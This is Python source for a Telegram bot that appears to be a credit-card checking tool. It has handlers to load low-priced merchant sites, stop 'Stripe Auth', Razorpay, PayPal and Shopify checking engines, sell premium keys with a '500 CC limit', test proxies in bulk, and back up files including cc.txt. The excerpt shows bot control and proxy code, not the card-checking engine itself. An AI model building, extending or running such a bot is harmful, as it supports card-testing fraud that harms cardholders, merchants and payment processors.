@client.on(events.NewMessage(pattern=r'(?i)^[/.]add(?:\s|$)'))
async def advanced_add_site(event):
    can_acc, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return
    
    user_id = event.sender_id
    raw_content = ""
    is_file = False

    msg = event.message
    if event.is_reply:
        replied = await event.get_reply_message()
        if replied.document: msg = replied

    if msg.document:
        is_file = True
        status_msg = await event.reply(premium_emoji("📦 <b>Downloading and reading file...</b>"), parse_mode='html')
        file_path = await msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding="utf-8", errors='ignore') as f:
            raw_content = await f.read()
        os.remove(file_path)
    else:
        raw_content = event.raw_text[4:].strip()
        if not raw_content and event.is_reply:
            replied = await event.get_reply_message()
            if replied: raw_content = replied.text
        
    if not raw_content:
        return await event.reply(premium_emoji("⚠️ Usage: Send sites with /add, reply to text with /add, or upload a file."), parse_mode='html')

    extracted = extract_and_clean_urls(raw_content)
    if not extracted: 
        return await event.reply(premium_emoji("❌ <b>No valid URLs found!</b>"), parse_mode='html')

    # Fixed Indentation below
    if not is_file and len(extracted) > 50:
        extracted = extracted[:50]
        # Do NOT call premium_emoji here; let the final reply handle it
        note = "\n⚠️ <b>Note: Text limit (50) applied.</b>"
    else: 
        note = ""

    TEMP_EXTRACTED[user_id] = extracted
    
    # Buttons use individual premium_emoji calls because they are separate strings
    btns = [
        [
            Button.inline("💰 0-5", f"selpr:0-5:{user_id}"), 
            Button.inline("💰 0-10", f"selpr:0-10:{user_id}")
        ],
        [
            Button.inline("💰 0-20", f"selpr:0-20:{user_id}"), 
            Button.inline("💰 0-30", f"selpr:0-30:{user_id}")
        ]
    ]
    
    # Process the whole string once here
    final_text = premium_emoji(f"Successfully extracted <code>{len(extracted)}</code> sites!{note}\nPlease select the target price range:")
    await event.reply(premium_emoji(final_text), buttons=btns, parse_mode='html')

# --- STOP HANDLER FOR SITE VERIFICATION (/add) ---

@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    uid = int(event.pattern_match.group(1).decode())
    
    if event.sender_id != uid and not is_admin(event.sender_id):
        return await event.answer("❌ Not your process!", alert=True)

    if uid in RUNNING_TASKS:
        # Purge from dictionary FIRST so the loop inside the function breaks immediately
        task = RUNNING_TASKS.pop(uid, None)
        if task:
            task.cancel()
        
        # Ensure it's removed from processes too
        ACTIVE_PROCESSES.pop(uid, None)
        
        await event.answer("🛑 Engine Killed. Generating Summary...", alert=True)
    else:
        await event.answer("❌ No active process found!", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_mchk:(\d+)"))
async def stop_mchk_callback(event):
    uid = int(event.pattern_match.group(1).decode())
    
    if event.sender_id != uid and not is_admin(event.sender_id):
        return await event.answer("❌ Not your process!", alert=True)

    if uid in RUNNING_TASKS:
        # Purge from dictionary FIRST so the loop inside the function breaks immediately
        task = RUNNING_TASKS.pop(uid, None)
        if task:
            task.cancel()
        
        # Ensure it's removed from processes too
        ACTIVE_PROCESSES.pop(uid, None)
        
        await event.answer("🛑 Stripe Auth Engine Killed. Generating Summary...", alert=True)
    else:
        await event.answer("❌ No active process found!", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_callback(event):
    uid = int(event.pattern_match.group(1).decode())

    if event.sender_id != uid and not is_admin(event.sender_id):
        return await event.answer("❌ Not your process!", alert=True)

    if uid in RUNNING_TASKS:
        task = RUNNING_TASKS.pop(uid, None)
        if task:
            task.cancel()
        ACTIVE_PROCESSES.pop(uid, None)
        await event.answer("🛑 Razorpay Engine Killed. Generating Summary...", alert=True)
    else:
        await event.answer("❌ No active process found!", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_mpp:(\d+)"))
async def stop_mpp_callback(event):
    uid = int(event.pattern_match.group(1).decode())

    if event.sender_id != uid and not is_admin(event.sender_id):
        return await event.answer("❌ Not your process!", alert=True)

    if uid in RUNNING_TASKS:
        task = RUNNING_TASKS.pop(uid, None)
        if task:
            task.cancel()
        ACTIVE_PROCESSES.pop(uid, None)
        await event.answer("🛑 PayPal Engine Killed. Generating Summary...", alert=True)
    else:
        await event.answer("❌ No active process found!", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_msh:(\d+)"))
async def stop_msh_callback(event):
    uid = int(event.pattern_match.group(1).decode())

    if event.sender_id != uid and not is_admin(event.sender_id):
        return await event.answer("❌ Not your process!", alert=True)

    if uid in RUNNING_TASKS:
        task = RUNNING_TASKS.pop(uid, None)
        if task:
            task.cancel()
        ACTIVE_PROCESSES.pop(uid, None)
        await event.answer("🛑 Shopify Engine Killed. Generating Summary...", alert=True)
    else:
        await event.answer("❌ No active process found!", alert=True)
        
@client.on(events.CallbackQuery(pattern=r"stopproc:(\d+)"))
async def stop_proc_handler(event):
    owner_id = int(event.pattern_match.group(1).decode())
    
    if event.sender_id != owner_id and not is_admin(event.sender_id):
        return await event.answer("❌ Not your process!", alert=True)

    # 1. Set global stop flag
    USER_PROCESS_STATUS[owner_id] = "stopped"
    
    # 2. Kill all pending sub-tasks (The HTTP requests)
    if owner_id in PENDING_SUBTASKS:
        for subtask in PENDING_SUBTASKS[owner_id]:
            if not subtask.done():
                subtask.cancel()
        PENDING_SUBTASKS.pop(owner_id)

    # 3. Kill the main engine task
    if owner_id in RUNNING_TASKS:
        RUNNING_TASKS[owner_id].cancel()
        
    await event.answer("🛑 ENGINE KILLED - GENERATING REPORT", alert=True)
    try:
        await event.delete() # Remove the progress bar message
    except:
        pass
               
# Helper function to check if price is in range
def is_price_matching(price_str, target_range):
    try:
        # Convert price to string if it's a float or int
        price_str = str(price_str)
        
        # Handle case where price is "-" or empty
        if not price_str or price_str == '-':
            return False
        
        # Step 1: Remove everything except numbers, decimal point, and negative sign
        # This handles "$6.65 USD", "£3.00 GBP", etc.
        clean_price = re.sub(r'[^\d.-]', '', price_str)
        
        # If the string is empty after cleaning, return False
        if not clean_price:
            return False
        
        # Handle edge case where price is just a decimal point or minus sign
        if clean_price in ['.', '-', '-.']:
            return False
        
        # Handle edge case where price has multiple decimal points (malformed)
        if clean_price.count('.') > 1:
            # Take only the first decimal point
            parts = clean_price.split('.')
            clean_price = parts[0] + '.' + parts[1]
        
        # Handle edge case where price has multiple minus signs
        if clean_price.count('-') > 1:
            # Remove all minus signs except the first one
            clean_price = '-' + clean_price.replace('-', '')
        
        price_val = float(clean_price)
        
        # Price should not be negative
        if price_val < 0:
            return False
        
        # Step 2: Split "0-10" into min=0, max=10
        range_parts = target_range.split('-')
        min_p = float(range_parts[0])
        max_p = float(range_parts[1])
        
        # Step 3: Compare
        result = min_p <= price_val <= max_p
        log_info("PRICE_CHECK", f"Price: {price_str} -> Clean: {clean_price} -> Val: {price_val} -> Range: {min_p}-{max_p} -> Match: {result}")
        return result
    except Exception as e:
        # If logic crashes, we reject it safely and log the error
        log_error("PRICE_CHECK", f"Error matching price '{price_str}' to range '{target_range}': {e}")
        return False

@client.on(events.CallbackQuery(pattern=r"selpr:(.*):(\d+)"))
async def selpr_handler(event):
    try:
        selected_range = event.pattern_match.group(1).decode()
        owner_id = int(event.pattern_match.group(2).decode())

        if event.sender_id != owner_id:
            return await event.answer("❌ Not your session!", alert=True)

        if owner_id in RUNNING_TASKS:
            return await event.answer("❌ A process is already running!", alert=True)

        if owner_id not in TEMP_EXTRACTED:
            return await event.answer("❌ Session expired. Please /add again.", alert=True)

        # UI SPEED FIX: Edit message FIRST, then start background task
        await event.edit(premium_emoji(f"🚀 **Initializing Engine...**\nTarget: `${selected_range}`", mode="md"))

        task, batch_id = start_batch_task(owner_id, run_site_verification(event, owner_id, selected_range), "site_verification")
        RUNNING_TASKS[owner_id] = task
        await event.answer(f"Engine Started | Batch {batch_id}", alert=False)

    except Exception as e:
        print(f"Error in selpr_handler: {e}")
def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮"

def access_denied_message_with_button():
    """Returns access denied message and join group button"""
    message = "🚫 **Access Denied!** This command requires premium access or group usage."
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+0EgyvdopAvszODQ8")]]
    return message, buttons

# --- Bot Command Handlers ---

# THIS IS THE CALLBACK HANDLER

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fl'))
async def fast_fetcher_handler(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    raw_text = ""
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg.document:
            status = await event.reply(premium_emoji("? **Downloading replied file...**", mode="md"))
            file_path = await replied_msg.download_media()
            async with aiofiles.open(file_path, 'r', encoding="utf-8", errors='ignore') as f:
                raw_text = await f.read()
            os.remove(file_path)
            await status.delete()
        else:
            raw_text = replied_msg.text
    elif event.message.document:
        status = await event.reply(premium_emoji("? **Downloading file...**", mode="md"))
        file_path = await event.message.download_media()
        async with aiofiles.open(file_path, 'r', encoding="utf-8", errors='ignore') as f:
            raw_text = await f.read()
        os.remove(file_path)
        await status.delete()
    else:
        raw_text = event.raw_text[3:].strip()

    if not raw_text:
        return await event.reply(premium_emoji("💎 **Usage:** Reply to a file/text or upload a file with `/fl`.", mode="md"))

    extracted = fetcher.parse(raw_text)
    count = len(extracted)

    if count == 0:
        return await event.reply(premium_emoji("No data detected ❌", mode="md"))

    try:
        if count <= 10:
            result_text = "✅ **Data Extracted:**\n\n" + "\n".join([f"`{c}`" for c in extracted])
            await event.reply(premium_emoji(result_text, mode="md"))
        else:
            output = io.BytesIO("\n".join(extracted).encode('utf-8'))
            output.name = "extracted.txt"
            caption = f"✅ <b>Extracted {count} items!</b>\nFiltered by <a href=\"https://t.me/iq_builder\">Mr Bad Guy</a>."
            
            # THE FIX: Try to send, catch FloodWait
            await event.reply(premium_emoji(caption), file=output, parse_mode='html')

    except FloodWaitError as e:
        # If Telegram tells us to wait, notify the user
        wait_msg = f"⚠️ **Telegram Rate Limit reached!**\nPlease wait `{e.seconds}` seconds before using this command again."
        await event.respond(premium_emoji(wait_msg, mode="md"))
        log_error("FLOOD", f"Bot is throttled for {e.seconds} seconds.")
    except Exception as e:
        log_error("FL_CMD", f"Error: {str(e)}")
        

# --- ADMIN FILE UPLOADER (UPDATE SYSTEM) ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]up'))
async def upload_update_handler(event):
    if not is_owner(event.sender_id):
        return 

    msg = event.message
    if event.is_reply:
        replied = await event.get_reply_message()
        if replied.document: msg = replied
            
    if not msg.document:
        return await event.reply(premium_emoji("💎 **Usage:** Send/Reply to a file with caption `/up` to update it.", mode="md"))

    file_name = msg.file.name
    if not file_name: return await event.reply(premium_emoji("❌ Could not detect filename.", mode="md"))
    file_name = os.path.basename(file_name)

    status = await event.reply(premium_emoji("💎 <b>Initializing Auto-Backup...</b>"), parse_mode='html')

    try:
        # 1. Prepare Backup Folder
        backup_dir = "backups"
        if not os.path.exists(backup_dir):
            os.makedirs(backup_dir)

        # 2. List of files to include in the backup
        files_to_backup = [
            "bot.py", "premium.json", "free_users.json", 
            "user_sites.json", "keys.json", "proxy.json", 
            "banned_users.json", "cc.txt", "sites.txt"
        ]

        # 3. Create the ZIP file
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        zip_filename = f"Backup_{timestamp}.zip"
        zip_path = os.path.join(backup_dir, zip_filename)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files_to_backup:
                if os.path.exists(file):
                    zipf.write(file)

        # 4. Send Backup to Admin
        await event.respond(
            premium_emoji(f"📦 <b>Pre-Update Backup Created</b>\n💎 <code>{timestamp}</code>"),
            file=zip_path,
            parse_mode='html'
        )

        # 5. Overwrite the file with the new version
        await status.edit(premium_emoji(f"💎 <b>Backup safe. Now updating</b> <code>{file_name}</code><b>...</b>"), parse_mode='html')
        await msg.download_media(file=file_name)
        
        await status.edit(
            premium_emoji(
                f"✅ <b>Update Successful!</b>\n\n"
                f"💎 <b>File:</b> <code>{file_name}</code>\n"
                f"📦 <b>Backup:</b> <code>{zip_filename}</code> <b>(Saved in /backups)</b>\n\n"
                f"🚀 <b>Type /reboot to apply the changes.</b>"
            ),
            parse_mode='html'
        )
        
        log_info("SYSTEM", f"OWNER updated {file_name}. Backup: {zip_filename}")

    except Exception as e:
        await status.edit(premium_emoji(f"❌ <b>Process Failed:</b>\n<code>{str(e)}</code>"), parse_mode='html')
        log_error("SYSTEM", f"Update system error: {e}")

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    """Legacy Telethon hook — authorization is handled by aiogram FSM."""
    if not is_admin(event.sender_id):
        return
    await aiogram_bot.send_message(
        event.sender_id,
        premium_emoji(
            f"{premium_emoji('🔐')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>Use /auth in direct bot chat to launch the step-by-step authorization tool.</code>"
        ),
        parse_mode='html'
    )

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /redeem {key}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        
        # Support both new TANJIRO- prefix format and old format without prefix
        actual_key = key
        if key not in keys_data:
            # Try without TANJIRO- prefix if user included it
            if key.startswith("TANJIRO-"):
                actual_key = key.replace("TANJIRO-", "", 1)
            else:
                # Try with TANJIRO- prefix if user didn't include it
                actual_key = f"TANJIRO-{key}"
        
        if actual_key not in keys_data: return await event.reply(premium_emoji("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮!", mode="md"))
        
        # Check if key is used - support both 'used' (boolean) and 'status' (string) fields
        key_data = keys_data[actual_key]
        is_used = key_data.get('used', False) or key_data.get('status') != 'unused'
        if is_used: return await event.reply(premium_emoji("❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙪𝙨𝙚𝙙!", mode="md"))
        if await is_premium_user(event.sender_id): return await event.reply(premium_emoji("❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!", mode="md"))
        days = key_data['days']
        await add_premium_user(event.sender_id, days)
        
        # Update key status - support both field formats
        key_data['used'] = True
        key_data['status'] = 'used'
        key_data['used_by'] = event.sender_id
        key_data['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        await event.reply(premium_emoji(f"💎 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!", mode="md"))
    except Exception as e: await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))
    
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm(?:\s|$)'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
        
    try:
        # Get the input text after the command
        rm_text = event.raw_text[3:].strip().lower()
        
        if not rm_text: 
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: `/rm site.com` or `/rm all`")

        sites_data = await load_json(SITE_FILE)
        user_id_str = str(event.sender_id)
        user_sites = sites_data.get(user_id_str, [])

        if not user_sites:
            return await event.reply(premium_emoji("❌ Your database is already empty.", mode="md"))

        # --- HANDLE REMOVE ALL ---
        if rm_text == "all":
            sites_data[user_id_str] = []
            await save_json(SITE_FILE, sites_data)
            return await event.reply(premium_emoji("? **Database Cleared!** All sites have been removed from your list.", mode="md"))

        # --- HANDLE SPECIFIC URLS ---
        urls_to_find = extract_urls_from_text(rm_text)
        if not urls_to_find:
            return await event.reply(premium_emoji("❌ No valid URLs/domains found in your message.", mode="md"))

        removed_sites = []
        not_found_sites = []

        # We create a new list excluding the sites the user wants to remove
        new_user_sites = []
        
        # Track which of the requested URLs were actually found
        found_map = {url: False for url in urls_to_find}

        for item in user_sites:
            # Handle both formats: "site.com" (string) or {"url": "site.com", ...} (dict)
            current_url = item['url'] if isinstance(item, dict) else item
            
            should_remove = False
            for target in urls_to_find:
                # Check if the target matches or is part of the URL in DB
                if target in current_url.lower() or current_url.lower() in target:
                    should_remove = True
                    found_map[target] = True
                    removed_sites.append(current_url)
                    break
            
            if not should_remove:
                new_user_sites.append(item)

        # Update lists for response
        for url, found in found_map.items():
            if not found:
                not_found_sites.append(url)

        # Save the updated list
        sites_data[user_id_str] = new_user_sites
        await save_json(SITE_FILE, sites_data)

        # Prepare Response
        response_parts = []
        if removed_sites:
            # Deduplicate removed list for clean display
            clean_removed = list(set(removed_sites))
            response_parts.append("✅ **Removed:**\n" + "\n".join(f"• `{s}`" for s in clean_removed))
        
        if not_found_sites:
            response_parts.append("❌ **Not Found:**\n" + "\n".join(f"• `{s}`" for s in not_found_sites))

        if response_parts:
            await event.reply(premium_emoji("\n\n".join(response_parts), mode="md"))
        else:
            await event.reply(premium_emoji("❌ No sites from your list matched the URLs provided.", mode="md"))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy(?:\s|$)'))
async def add_proxy(event):
    if event.is_group:
        return await event.reply(premium_emoji("💎 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!", mode="md"))
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        input_parts = event.raw_text.split(maxsplit=1)
        if len(input_parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩:\n`/addpxy ip:port:user:pass` (Single)\n\n**OR Paste multiple proxies on new lines.**")
        
        proxy_lines = input_parts[1].strip().split('\n')
        proxies_data = await load_json(PROXY_FILE)
        user_proxies = proxies_data.get(str(event.sender_id), [])
        
        current_count = len(user_proxies)
        if current_count >= 100:
            return await event.reply(premium_emoji("❌ 𝙇𝙞𝙢𝙞𝙩 𝙍𝙚𝙖𝙘𝙝𝙚𝙙! You already have 100 proxies. Use `/rmpxy all` to clear them.", mode="md"))

        status_msg = await event.reply(premium_emoji(f"🔄 **𝙄𝙣𝙞𝙩𝙞𝙖𝙡𝙞𝙯𝙞𝙣𝙜...**\nFound `{len(proxy_lines)}` potential proxies. Starting concurrent test...", mode="md"))

        # 1. Parse and Filter Unique New Proxies
        valid_tasks = []
        to_test = []
        
        for line in proxy_lines:
            if (len(user_proxies) + len(to_test)) >= 100:
                break
                
            p_data = parse_proxy_format(line.strip())
            if not p_data: continue
            
            # Skip duplicates already in DB
            if any(existing['proxy_url'] == p_data['proxy_url'] for existing in user_proxies):
                continue
                
            to_test.append(p_data)
            # Create the testing task
            valid_tasks.append(test_proxy(p_data['proxy_url']))

        if not valid_tasks:
            return await status_msg.edit(premium_emoji("⚠️ No new or valid proxy formats found to test.", mode="md"))

        # 2. Run Concurrent Tests
        await status_msg.edit(premium_emoji(f"⚡ **𝙏𝙚𝙨𝙩𝙞𝙣𝙜 {len(valid_tasks)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙘𝙤𝙣𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮...**\nPlease wait a few seconds.", mode="md"))
        results = await asyncio.gather(*valid_tasks)

        # 3. Process Results
        added_this_time = 0
        failed_count = 0
        
        for i, (is_working, ip_info) in enumerate(results):
            if is_working:
                user_proxies.append(to_test[i])
                added_this_time += 1
            else:
                failed_count += 1

        # 4. Save to Database
        proxies_data[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies_data)
        
        # 5. Final Report
        report = (
            f"✅ **𝙄𝙢𝙥𝙤𝙧𝙩 𝙍𝙚𝙨𝙪𝙡𝙩𝙨**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"? Working & Added: `{added_this_time}`\n"
            f"? Dead/Timed Out: `{failed_count}`\n"
            f"📊 Total in DB: `{len(user_proxies)}/100`"
        )
        await status_msg.edit(premium_emoji(report, mode="md"))
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]px(?:\s|$)'))
async def proxy_checker(event):
    if event.is_group:
        return await event.reply(premium_emoji("💎 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!", mode="md"))

    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    raw_text = ""
    from_file = False
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.document:
            from_file = True
            file_path = await replied_msg.download_media()
            try:
                async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    raw_text = await f.read()
            finally:
                try: os.remove(file_path)
                except: pass
        elif replied_msg and replied_msg.text:
            raw_text = replied_msg.text
    else:
        parts = event.raw_text.split(maxsplit=1)
        raw_text = parts[1] if len(parts) > 1 else ""

    if not raw_text.strip():
        return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎\n`/px ip:port:user:pass`\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 / 𝙥𝙧𝙤𝙭𝙮 𝙡𝙞𝙨𝙩 𝙬𝙞𝙩𝙝 /px", mode="md"))

    parsed = []
    seen = set()
    for line in raw_text.splitlines():
        proxy_text = line.strip()
        if not proxy_text:
            continue
        proxy_data = parse_proxy_format(proxy_text)
        if not proxy_data:
            continue
        if proxy_data["proxy_url"] in seen:
            continue
        seen.add(proxy_data["proxy_url"])
        parsed.append((proxy_text, proxy_data))

    if not parsed:
        return await event.reply(premium_emoji("⚠️ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙥𝙧𝙤𝙭𝙮 𝙛𝙤𝙧𝙢𝙖𝙩𝙨 𝙛𝙤𝙪𝙣𝙙.", mode="md"))

    total_found = len(parsed)
    max_check = 5000 if from_file else 500
    if len(parsed) > max_check:
        parsed = parsed[:max_check]
        await event.reply(premium_emoji(f"⚠️ 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨. 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {max_check}.", mode="md"))

    total = len(parsed)
    checked = 0
    working = 0
    dead = 0
    results_for_report = []
    working_proxies = []
    semaphore = asyncio.Semaphore(25)
    last_ui_update = 0
    status_msg = await event.reply(premium_emoji(f"🛠 <b>Proxy Checker Started</b>\n\n📊 <b>Total:</b> <code>{total}</code>\n✅ <b>Working:</b> <code>0</code>\n❌ <b>Dead:</b> <code>0</code>"), parse_mode='html')

    async def throttled_proxy_check(original, proxy_data):
        async with semaphore:
            start_time = time.time()
            is_working, info = await test_proxy(proxy_data["proxy_url"])
            elapsed_time = round(time.time() - start_time, 2)
            return original, proxy_data, is_working, info, elapsed_time

    tasks = [asyncio.create_task(throttled_proxy_check(original, proxy_data)) for original, proxy_data in parsed]

    try:
        for completed_task in asyncio.as_completed(tasks):
            original, proxy_data, is_working, info, elapsed_time = await completed_task
            checked += 1
            if is_working:
                working += 1
                working_proxies.append(proxy_data)
                results_for_report.append(f"{original} | WORKING | IP: {info} | {elapsed_time}s")
            else:
                dead += 1
                results_for_report.append(f"{original} | DEAD | {info} | {elapsed_time}s")

            if checked == total or (time.time() - last_ui_update) > 2:
                last_ui_update = time.time()
                buttons = [
                    [Button.inline(f"✅ Working [ {working} ]", b"n")],
                    [Button.inline(f"❌ Dead [ {dead} ]", b"n")],
                    [Button.inline(f"📊 Progress [{checked}/{total}]", b"n")]
                ]
                try:
                    await status_msg.edit(premium_emoji("🛠 <b>Checking Proxies...</b>"), buttons=buttons, parse_mode='html')
                except:
                    pass
    finally:
        pending_tasks = [task for task in tasks if not task.done()]
        if pending_tasks:
            for task in pending_tasks:
                task.cancel()
            await asyncio.gather(*pending_tasks, return_exceptions=True)

    report_stream = io.BytesIO()
    report_data = f"📊 PROXY CHECK REPORT | Checked: {checked}/{total}\n"
    report_data += f"Working: {working} | Dead: {dead}\n"
    report_data += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    report_data += "\n".join(results_for_report)
    report_stream.write(report_data.encode("utf-8"))
    report_stream.seek(0)
    report_stream.name = "Proxy_Check_Report.txt"

    caption = premium_emoji(f"✅ <b>Proxy Check Complete!</b>\n\n📊 Checked: <code>{checked}/{total}</code>\n✅ Working: <code>{working}</code>\n❌ Dead: <code>{dead}</code>")
    try:
        await status_msg.delete()
    except:
        pass
    await event.respond(caption, file=report_stream, parse_mode='html')

def extract_paypal_sites_from_text(text):
    return list(dict.fromkeys(re.findall(r'https?://(?:www\.)?paypal\.com/ncp/payment/[A-Za-z0-9_-]+', text or "", flags=re.IGNORECASE)))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ps(?:\s|$)'))
async def add_paypal_site(event):
    if not is_admin(event.sender_id):
        return

    raw_text = event.raw_text.split(maxsplit=1)[1] if len(event.raw_text.split(maxsplit=1)) > 1 else ""
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            raw_text += "\n" + replied_msg.text

    new_sites = extract_paypal_sites_from_text(raw_text)
    if not new_sites:
        return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎\n`/ps https://www.paypal.com/ncp/payment/XXXXXXXXXXXXX`", mode="md"))

    existing_sites = await load_paypal_sites()
    existing_keys = {site.lower().rstrip("/") for site in existing_sites}
    added = []
    for site in new_sites:
        key = site.lower().rstrip("/")
        if key in existing_keys:
            continue
        existing_sites.append(site)
        existing_keys.add(key)
        added.append(site)

    async with aiofiles.open(PAYPAL_SITE_FILE, "w", encoding="utf-8") as f:
        await f.write("\n".join(existing_sites) + "\n")

    await event.reply(premium_emoji(f"✅ <b>PayPal Sites Updated</b>\n\n➕ Added: <code>{len(added)}</code>\n📊 Total: <code>{len(existing_sites)}</code>", mode="html"), parse_mode='html')

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rps(?:\s+(.+))?$'))
async def remove_paypal_site(event):
    if not is_admin(event.sender_id):
        return

    arg = (event.pattern_match.group(1) or "").strip()
    sites = await load_paypal_sites()
    if not arg:
        preview = "\n".join([f"{i}. {site}" for i, site in enumerate(sites, 1)])
        return await event.reply(premium_emoji(f"𝙁𝙤𝙧𝙢𝙖𝙩 💎\n`/rps 1` 𝙤𝙧 `/rps paypal_url` 𝙤𝙧 `/rps all`\n\n<blockquote>{preview}</blockquote>", mode="md"), parse_mode='html')

    removed = []
    if arg.lower() == "all":
        removed = sites[:]
        sites = []
    elif arg.isdigit():
        index = int(arg) - 1
        if index < 0 or index >= len(sites):
            return await event.reply(premium_emoji("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭.", mode="md"))
        removed.append(sites.pop(index))
    else:
        target = arg.lower().rstrip("/")
        kept = []
        for site in sites:
            if site.lower().rstrip("/") == target:
                removed.append(site)
            else:
                kept.append(site)
        sites = kept

    if not removed:
        return await event.reply(premium_emoji("❌ 𝙋𝙖𝙮𝙋𝙖𝙡 𝙨𝙞𝙩𝙚 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙.", mode="md"))

    async with aiofiles.open(PAYPAL_SITE_FILE, "w", encoding="utf-8") as f:
        await f.write("\n".join(sites) + ("\n" if sites else ""))

    await event.reply(premium_emoji(f"✅ <b>PayPal Site Removed</b>\n\n➖ Removed: <code>{len(removed)}</code>\n📊 Remaining: <code>{len(sites)}</code>", mode="html"), parse_mode='html')

